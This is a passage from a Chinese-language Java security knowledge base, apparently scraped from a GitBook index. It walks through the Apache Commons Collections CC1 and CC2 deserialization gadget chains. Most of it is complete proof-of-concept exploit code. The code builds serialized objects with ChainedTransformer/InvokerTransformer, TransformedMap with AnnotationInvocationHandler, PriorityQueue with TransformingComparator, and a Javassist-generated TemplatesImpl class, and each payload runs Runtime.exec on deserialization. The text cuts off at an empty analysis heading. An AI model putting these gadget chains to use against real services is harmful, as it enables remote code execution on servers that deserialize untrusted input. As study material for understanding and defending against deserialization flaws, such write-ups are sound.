org.apache.commons.collections.functors.InvokerTransformer; import java.io.*; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); // 客户端序列化写成文件 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(transformerChain); // 服务端反序列化payload 读取 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); //服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input Transformer transformer = (ChainedTransformer) objectInputStream.readObject(); transformer.transform(null); } } 但是很遗憾的告诉以为快要成功的你，成功的本地测试加上序列化、反序列化过程之后就会失败。 因为Runtime类的定义没有继承Serializable类，所以是不支持反序列化的。 那么我们在payload写入Runtime实例的计划就泡汤了 在服务端生成Runtime实例 既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？ 我们知道Runtime的实例是通过Runtime.getRuntime()来获取的，而InvokerTransformer里面的反射机制可以执行任意函数。 同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的。 我们先看getRuntime方法的参数 public static Runtime getRuntime() { return currentRuntime; } Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class),//得到Runtime class //由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样 //上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可） new InvokerTransformer(\"getRuntime\",new Class[]{},new Object[]{}), //上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例) new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); transformerChain.transform(null); 看起来万事大吉了，但是 在对InvokerTransformer中Class cls = input.getClass(); 的解释中可以知道 当input是一个类的实例对象，获取到的是这个类 当input是一个类时，获取到的是java.lang.Class 我们来推演第一次InvokerTransformer的反射调用，即得到Runtime类对象的getRuntime方法调用 //InvokeTransformer关键语句： public Object transform(Object input) {//input为我们设置的常量Runtime.class Class cls = input.getClass();//这里由于input是一个类，会得到java.lang.Class //在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错 Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } 那么我们好像陷入了一个死胡同： 得到Runtime类实例才能调用exec方法。 而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例......... 继续反思反射机制 那么我们通过直接调用Runtime.getRuntime方法好像是行不通了,有没有其他方法呢？ 目前问题有如下： 我们开头不能获得Class.forName(\"java.lang.Runtime\")，只能得到Class.forName(\"java.lang.Class\") 我们可以有任意的反射机制 我们要获取到Runtime.getRunime函数，并执行它。 通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制 通过getMethod函数获取Runtime类中的getRuntime函数 在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的 再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数 invoke调用getRuntime函数，获取Runtime类的实例 这里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类 我们最终要目的要执行 Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\") 先来获取getRuntime类 //目标语句 Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\") //使用java.lang.Class开头 Class.forName(\"java.lang.Class\").getMethod(\"getMethod\", new Class[] {String.class, Class[].class }) .invoke(Class.forName(\"java.lang.Runtime\"),\"getRuntime\",new Class[0]); //invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数 对照着InvokerTransformer类转变为transformers格式 Class cls = input.getClass();//cls = java.lang.Class Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethod方法 return method.invoke(input, this.iArgs); //在Runtime中找getRuntime方法，并返回这个方法 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), //还需要填充 调用getRuntime得到Runtime实例, new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; 还差执行获取到的getRuntime，下一个input是上一个执行接口，继续对照 //input=getRuntime这个方法 Class cls = input.getClass();//cls = java.lang.Method（getRuntime方法是method类） Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //在method类中找到invoke方法，method=invoke方法 return method.invoke(input, this.iArgs); //调用invoke方法，input=getRuntime这个方法，传入自定义的参数 以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。 首先this.iMethodName, this.iParamTypes是根据invoke接口而定的： public Object invoke(Object obj, Object... args) //this.iMethodName=\"invoke\" //this.iParamTypes=new Class[] {Object.class, Object[].class } //外面class、Object封装是InvokerTransformer类的构造函数要求 按照invoke中的input才是它要调用的环境的准则。 invoke方法.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)， 而input=getRuntime方法，那么只要填入this.iArgs就好了 又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。 this.iArgs=null,new Object[0] 那么整合如下： Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] {\"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] {String.class }, new Object[] {\"calc.exe\"}) }; 也就是我们Commons Collections1的前置知识里讲的payload，到了这里才讲到为什么构造前置知识中的payload TransformedMap 那么我们在第二步通过ConstantTransformer、ChainedTransformer就完成了payload在客户端自定义这一目标，我们看一下目前的攻击流程 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class, Class[].class},new Object[]{\"getRuntime\",new Class[0]}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(transformerChain); FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Transformer transformer = (ChainedTransformer) objectInputStream.readObject(); transformer.transform(null); } } 完成命令执行服务端执行如下操作： 服务端反序列化我们的输入成ChainedTransformer类型 调用这个输入的transform()函数 转变的类型是一个数据转化链数据格式，很明显服务端不可能存在这种代码，利用价值不足，接下来我们需要继续延长这个漏洞链。 封装成Map 由于我们得到的是ChainedTransformer，一个转换链，TransformedMap类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。 这样我们就可以把触发条件从显性的调用转换链的transform函数延伸到修改map的值。很明显后者是一个常规操作，极有可能被触发 TransformedMap public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //payload序列化写入文件，模拟网络传输 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(outerMap); // 服务端反序列化客户端代码，触发漏洞 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); //服务端反序列化成Map格式，再调用transform函数 Map outerMap_now = (Map) objectInputStream.readObject(); //2.1可以直接map添加新值，触发漏洞 outerMap_now.put(\"123\", \"123\"); //2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞 // Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); // onlyElement.setValue(\"foobar\"); } } jdk1.7 AnnotationInvocationHandler的readObject复写点 上面的漏洞触发条件仍然不够完美，需要服务端把我们传入的序列化内容反序列化为map，并对值进行修改。 之前也说过完美的反序列化漏洞还需要一个readobject复写点，只要服务端执行了readObject函数就等于命令执行。 在jdk1.7中就存在一个完美的readobject复写点的类sun.reflect.annotation.AnnotationInvocationHandler。 先看对应的构造函数 AnnotationInvocationHandler(Class var1, Map var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {//var1满足这个if条件时 this.type = var1;//传入的var1到this.type this.memberValues = var2;//我们的map传入this.memberValues } else { throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); } } readobject复写函数 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { //默认反序列化 var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); } Map var3 = var2.memberTypes();// Iterator var4 = this.memberValues.entrySet().iterator();//获取我们构造map的迭代器 while(var4.hasNext()) { Entry var5 = (Entry)var4.next();//遍历map迭代器 String var6 = (String)var5.getKey();//获取key的名称 Class var7 = (Class)var3.get(var6);//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样 if (var7 != null) { Object var8 = var5.getValue();//获取map的value if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) { //两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功 var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); } } } } } readObject最终对于我们传入构造函数的map进行遍历赋值。 这样就弥补了我们之前反序列化需要服务端存在一些条件的不足，形成完美反序列化攻击 最终模拟攻击代码 package com.myproject; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class test { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); Object object = constructor.newInstance(Target.class,outerMap); //payload序列化写入文件，模拟网络传输 FileOutputStream fileOutputStream = new FileOutputStream(\"payload.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(object); // 服务端反序列化客户端代码，触发漏洞 FileInputStream fileInputStream = new FileInputStream(\"payload.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); // 直接反序列化 objectInputStream.readObject(); } } 至此，我们在客户端构造了payload发送至服务端， 只要服务端 对我们的输入进行反序列化 jdk版本为1.7 就可以直接完成命令执行 问题 为什么innerMap.put(\"value\", \"value\");将key更改为其他值，就不能执行成功？(innerMap.put(\"key\", \"value\");这种格式) debug一下看看 在readObject中，var3是一个map结构，var6 会获取我们构造的map中的key值，然后通过key值取var3中的class，如果var6!=value，那么var7为空，不能进入if结构，导致不能进行setValue操作（也就是反序列化赋值操作），所以在这里需要将值固定为键值设置为value 参考链接 https://xz.aliyun.com/t/7031 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 20:57:53 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/19.CommonsCollections/01.CC1/02.CommonsCollections1分析利用.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/19.CommonsCollections/02.CC2/CommonsCollection2分析.html":{"url":"知识库/02.JAVA安全/19.CommonsCollections/02.CC2/CommonsCollection2分析.html","title":"CommonsCollection2分析","keywords":"","body":" 简介 环境 POC 提出问题 分析 解决方案 Javassist 介绍 ClassPool CtClass 示例代码 POC 0x1 0x2 0x3 0x4 0x5 分析 总结 参考链接 简介 CC2 使用的是 javassist和PriorityQueue来构造利用链，并且使用的是commons-collections-4.0版本，而3.1-3.2.1版本中TransformingComparator并没有去实现Serializable接口，也就是说这是不可以被序列化的，所以CC2不用3.x版本 环境 jdk1.8 commons collections4-4.0 POC 首先看poc package com.myproject; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCC2 { public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class}, new String[] {\"calc.exe\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator Tcomparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,Tcomparator); try{ ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"cc2.ser\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"cc2.ser\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } ysoserial提供的利用链如下 /* Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() */ 我们可以看到这段代码，和CC1中的payload是一样的，看过Commons Collection1 分析利用的朋友在这里不难理解为什么我们要这样构造 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class}, new String[] {\"calc.exe\"}), }; 提出问题 然后看下面的代码，就会好奇了 Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator Tcomparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,Tcomparator); 我们在Commons Collection1 分析利用中可以知道，我们需要创建一个map，并绑定transformerchain，并在最后给予map数据转化链，然后再进行序列化，反序列化 最后再触发漏洞。在cc2链其实差不太多，我们需要给予一个数据转化链给comparator(比较器)，并绑定transformerchain，然后通过给queue(队列)赋值，最后序列化该实例queue，再反序列化，完成攻击。 并且在java.util.PriorityQueue构造函数中，存在构造函数是可以传入comparator的，为什么还要通过反射，给comparator赋值呢？ public PriorityQueue(int initialCapacity, Comparator comparator) { // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity 那么我们不使用反射，就利用构造函数来试一试呢？ package com.myproject; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCC2 { public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] {String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class}, new String[] {\"calc.exe\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); TransformingComparator Tcomparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(1, Tcomparator); queue.add(1); queue.add(2); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"cc2.ser\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"cc2.ser\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } 在这里就有一个很隐藏的问题，看似执行了命令，但是却没有生成cc2.ser反序列化文件，说明没有进入try{}catch()，那么执行的命令就是客户端命令，而不会发送到服务端 在此处分析一下，为什么我们将Tcomparator通过构造函数写进去，生成的实例化对象queue，是不会进行进入try代码块序列化，就直接在客户端执行命令 分析 在queue.add处调试，在PriorityQueue这个构造函数中，这里就是我们传入的TransformingComparator 继续跟进，在queue.add(2)中，调用了offer方法 跟进offer方法，在这里需要关注siftUp方法 在siftUp方法中，comparator不为null(是我们传入的TransformingComparator)，则进入if循环，调用siftUpUsingComparator 方法 重点到comparator.compare()方法中，跟进 就到了compare方法中，在这里调用了两次this.transformer.transform方法 iTransformer从arr(构造的transformers[]数组)里取值，再调用transform方法 transform 方法就实现链式调用，执行transformers[]数组的Runtime.getRuntime.exec() 方法 像这样执行了两次，导致会弹出两次计算器，然后在此处执行完命令就抛出异常，程序就直接crash此时根本就还只是在向队列添加数据阶段，还没有进行序列化就直接crash，是根本就不行的 解决方案 我们在调用了siftUpUsingComparator方法，如果不走if分支，走else分支呢？也就是说不传入comparator，让其为null PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); 当其为null的时候，进入siftUpComparable方法，可以发现在这里只对队列进行了赋值操作，并没有进行compare操作。 返回后就执行序列化代码，但是并没有执行命令 那么如果需要在readObject中调用compare方法这个是否可能成功呢? 这里我们要知道，序列化是将对象转换成字符串的过程，反序列化是将字符串转换成对象的过程，那么在反序列化的过程中，读取了字符串，将其转换成对象之后是不是就需要赋值操作呢？那么在赋值操作的时候，我们不让comparator为null，那么就能进入到siftDownUsingComparator函数中 条件： 要执行try-catch代码块的内容 -> queue 只执行赋值操作，在进行赋值操作的时候，comparator为null 在readObject的时候，需要执行compare函数 -> 赋值操作完成之后，序列化时PriorityQueue的comparator不能为null，否则反序列化时comparator就会为空，就不能进入siftDownUsingComparator函数中 queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,Tcomparator); 在反序列化的时候，在readObejct函数里，执行heapify函数 我们通过反射设置了comparator为Tcomparator，此时comparator不为null，此时进入siftDownUsingComparator函数 在执行compare函数后，就执行transformer.transform方法，进行链式调用执行 到这里就执行了Runtime.getRuntime.exec(\"calc.exe\") Javassist Javassit字节码编程 介绍 Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。 能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。 Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。下面大概讲一下POC中会用到的类和方法： ClassPool ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。常用方法： static ClassPool getDefault()：返回默认的ClassPool，一般通过该方法创建我们的ClassPool； ClassPath insertClassPath(ClassPath cp)：将一个ClassPath对象插入到类搜索路径的起始位置； ClassPath appendClassPath：将一个ClassPath对象加到类搜索路径的末尾位置； CtClass makeClass：根据类名创建新的CtClass对象； CtClass get(java.lang.String classname)：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用； CtClass CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取 常用方法： void setSuperclass(CtClass clazz)：更改超类，除非此对象表示接口； byte[] toBytecode()：将该类转换为类文件； CtConstructor makeClassInitializer()：制作一个空的类初始化程序（静态构造函数）；示例代码 ```java package com.myproject; import javassist.*; public class TestJavassist { public static void createPerson() throws Exception{ //实例化一个ClassPool容器 ClassPool pool = ClassPool.getDefault(); //新建一个CtClass，类名为Cat CtClass cc = pool.makeClass(\"Cat\"); //设置一个要执行的命令 String cmd = \"System.out.println(\\\"javassit_test succes!\\\");\"; //制作一个空的类初始化，并在前面插入要执行的命令语句 cc.makeClassInitializer().insertBefore(cmd); //重新设置一下类名 String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); //将生成的类文件保存下来 cc.writeFile(); //加载该类 Class c = cc.toClass(); //创建对象 c.newInstance(); } public static void main(String[] args) throws Exception { createPerson(); } } 新生成的类是这样子的，其中有一块static代码； ![image.png](./Commons Collection2 分析.assets/2023_05_19_10_37_19_Z49RiqS1.png) 当该类被实例化的时候，就会执行static里面的语句； 在ysoserial的cc2中引入了 TemplatesImpl 类来进行承载攻击payload，需要用到javassist； ### POC ```java package com.myproject; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.*; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestJavassist { public static void main(String[] args) throws Exception { Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); // cc.writeFile(); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); setFieldValue(templates, \"_class\", null); Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2.bin\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } 由于这个链于第一个payload 不同，在这里我讲解每一段代码的用法 0x1 通过反射实例化InvokerTransformer对象，设置InvokerTransformer的methodName为newTransformer；这里做的目的是为了调用后面我们设置的**TemplatesImpl**的**newTransformer**方法，而这个**Tcomparator**就如第一个poc一样，将进入**comparator.compare()**方法，进行**transform**方法，进而执行**method.invoke(input,this.args)**，为后续做铺垫 Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator Tcomparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); 0x2 这里需要使用javassit对应的代码，为什么要继承AbstractTranslet类？这里为什么要将类转换成byte数据，并且还一定要放置在byte[][]中？ //实例化一个ClassPool容器 ClassPool pool = ClassPool.getDefault(); //向pool容器类搜索路径的起始位置插入AbstractTranslet.class pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); //新建一个CtClass，类名为Cat CtClass cc = pool.makeClass(\"Cat\"); //设置一个要执行的命令 String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; //制作一个空的类初始化，并在前面插入要执行的命令语句 cc.makeClassInitializer().insertBefore(cmd); //重新设置一下类名，生成的类的名称就不再是Cat String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); // cc.writeFile(); //继承AbstractTranslet类 **重点** cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //将该类转换为字节数组 byte[] classBytes = cc.toBytecode(); //将一维数组classBytes放到二维数组targetByteCodes的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; 在这里因为我们使用的TemplatesImpl，在其对应的_bytecodes参数中，是需要一个二维byte数组，并且在后续需要实例化_bytecodes的时候会检查是否继承了AbstractTranslet类 0x3 在这里通过给实例化的templates中的_bytecodes，_name，_class赋值操作，由于这些参数都是private，只能通过反射赋值，且_bytecodes为javassit动态生成的恶意类，_name可以为任意值，但是不能为空，_class一定为null，为什么要这样，在调试的时候再做解释 TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"1\"); setFieldValue(templates, \"_class\", null); public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } 0x4 第一部分相当于是给queue赋值，相当于执行add操作，第二部分是给queue设置为2，第三部分就是在poc中强调的部分，最后通过反射将comparator绑定到实例化的queue中 Object[] queue_array = new Object[]{templates,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,Tcomparator); 0x5 模拟网络传输，执行序列化与反序列化 try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2.bin\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } 分析 